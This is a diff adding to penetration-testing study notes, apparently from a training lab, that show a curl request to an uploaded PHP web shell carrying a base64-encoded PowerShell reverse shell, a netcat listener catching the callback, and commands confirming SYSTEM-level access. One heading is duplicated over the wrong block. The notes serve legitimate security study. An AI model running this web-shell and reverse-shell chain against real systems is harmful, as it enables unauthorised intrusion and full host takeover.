@@ -72,3 +72,39 @@ Encoding the oneliner in PowerShell on Linux
 >PS> exit
 >```
 
+Using curl to send the base64 encoded reverse shell oneliner
+>``` shell
+>kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+>...
+>AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+>```
+
+Using curl to send the base64 encoded reverse shell oneliner
+>``` shell
+>kali@kali:~$ nc -nvlp 4444
+>
+># ========== Expected Result ==========
+>listening on [any] 4444 ...
+>connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
+>ipconfig
+>
+>Windows IP Configuration
+>
+>
+>Ethernet adapter Ethernet0 2:
+>
+>   Connection-specific DNS Suffix  . : 
+>   IPv4 Address. . . . . . . . . . . : 192.168.50.189
+>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+>   Default Gateway . . . . . . . . . : 192.168.50.254
+># =====================================
+>
+>PS C:\xampp\htdocs\meteor\uploads> whoami
+>
+>># ========== Expected Result ==========
+>nt authority\system
+># =====================================
+>```
+
+
+
